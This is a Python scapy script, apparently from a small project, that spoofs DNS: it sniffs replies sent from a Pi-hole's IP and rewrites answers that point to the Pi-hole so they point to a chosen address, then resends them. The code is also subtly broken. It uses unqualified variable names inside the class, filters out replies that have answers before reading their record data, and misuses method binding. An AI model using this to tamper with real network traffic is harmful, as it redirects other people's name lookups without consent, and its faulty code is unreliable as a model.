from scapy.all import *
import signal
from TimeoutException import TimeoutException

class Dns:
    'Dns class handles the DNS spoofing for all responses from Pi-hole'
    
    piIP = ""
    resultIP = ""
    
    def __init__(self, piIP, resultIP):
        self.piIP = piIP
        self.resultIP = resultIP
        return
    
    # Changes DNS responses sent by the Pi-hole for timeout seconds'
    def spoofer(self, timeout):
        if timeout > 0:
            signal.signal(signal.SIGALRM, Dns.timeoutHandler)
        try:
            signal.alarm(timeout)
            # Construct Berkeley Packet filter
            filter = "ip src " + self.piIP + " and udp src port 53"
            sniff(filter=filter, prn=Dns.responder)
        except TimeoutException:
            return

    # Changes the DNS request if necessary and forwards it
    def responder(pkt):
        if pkt[IP].src != piIP :
            return
        if DNS in pkt and (pkt[DNS].opcode != 0 or pkt[DNS].ancount != 0):
            return
        # Check if we should change the packet
        # Other changing behaviour should be implemented here
        if pkt[DNS].rdata == piIP:
            # Change the packet
            pkt[DNS].rdata = resultIP
        # Always forward the (possibly changed) answer
        send(pkt)
        return

    def timeoutHandler(signum, frame):
        raise TimeoutException("Spoofing timeout")

    pass
